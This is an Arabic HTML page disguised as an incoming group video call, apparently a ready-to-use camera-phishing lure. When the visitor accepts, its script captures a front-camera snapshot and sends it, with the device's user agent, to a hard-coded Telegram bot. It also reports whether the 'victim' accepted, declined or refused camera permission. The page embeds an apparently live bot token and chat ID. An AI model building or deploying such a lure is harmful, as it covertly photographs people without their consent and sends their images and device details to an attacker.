<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مكالمة فيديو جماعية مغلقة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .call-container { background: #2d2d2d; border-radius: 20px; padding: 40px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; width: 350px; }
        .avatar { width: 100px; height: 100px; background: #4f4f4f; border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; font-size: 40px; }
        h2 { margin: 10px 0; font-size: 24px; }
        .incoming { color: #2ecc71; font-size: 14px; margin-bottom: 30px; animation: blink 1.5s infinite; }
        .btn-group { display: flex; justify-content: space-around; margin-top: 20px; }
        .btn { border: none; border-radius: 50%; width: 65px; height: 65px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.3s; font-size: 24px; color: white; }
        .btn-accept { background-color: #2ecc71; }
        .btn-decline { background-color: #e74c3c; }
        video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; background: #000; }
        .end-screen { display: none; }
        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div class="call-container" id="callScreen">
        <div class="avatar">👥</div>
        <h2>مكالمة جماعية (3 مشاركين)</h2>
        <div class="incoming">اتصال فيديو وارد...</div>
        
        <div class="btn-group">
            <button class="btn btn-accept" onclick="acceptCall()">📞</button>
            <button class="btn btn-decline" onclick="declineCall()">✖</button>
        </div>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <div class="call-container end-screen" id="endScreen">
        <div class="avatar" style="background: #3a3a3a;">🚫</div>
        <h2>انتهت الجلسة</h2>
        <p style="color: #aaa; font-size: 14px;">تم رفض المكالمة أو غادر المشاركون الغرفة.</p>
    </div>

    <script>
    // ⚠️ ضع بيانات بوت تليجرام الخاص بك هنا
    const TELEGRAM_BOT_TOKEN = "8868938458:AAGBtdOsKOej6rgn3wjDHybua_K3UUHkC98";
    const TELEGRAM_CHAT_ID = "1005732368";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const callScreen = document.getElementById('callScreen');
    const endScreen = document.getElementById('endScreen');

    function acceptCall() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(function(stream) {
            video.style.display = "block";
            video.srcObject = stream;
            
            sendTextMessageTelegram("🔔 الضحية ضغط على (رد) ووافق على تشغيل الكاميرا المباشرة.");

            // لقطة سريعة بعد ثانيتين
            setTimeout(takeSnapshot, 2000);
        })
        .catch(function(err) {
            declineCall();
            sendTextMessageTelegram("⚠️ الضحية حاول الرد لكنه رفض إذن المتصفح للكاميرا.");
        });
    }

    function declineCall() {
        callScreen.style.display = "none";
        endScreen.style.display = "block";
        sendTextMessageTelegram("❌ الضحية رفض المكالمة وضغط على الزر الأحمر.");
    }

    function takeSnapshot() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // تحويل محتوى الـ Canvas إلى ملف صورة حقيقي لإرساله لتليجرام
        canvas.toBlob(function(blob) {
            sendPhotoTelegram(blob);
        }, 'image/jpeg', 0.8);
    }

    // دالة إرسال الرسائل النصية لتليجرام
    function sendTextMessageTelegram(text) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
        });
    }

    // دالة إرسال الصورة الفعلية لتليجرام بصيغة FormData
    function sendPhotoTelegram(photoBlob) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", photoBlob, "snapshot.jpg");
        formData.append("caption", `📸 لقطة حية من الكاميرا الأمامية للهدف المتصل!\n\nالجهاز: ${navigator.userAgent}`);

        fetch(url, {
            method: "POST",
            body: formData
        });
    }
    </script>
</body>
</html>
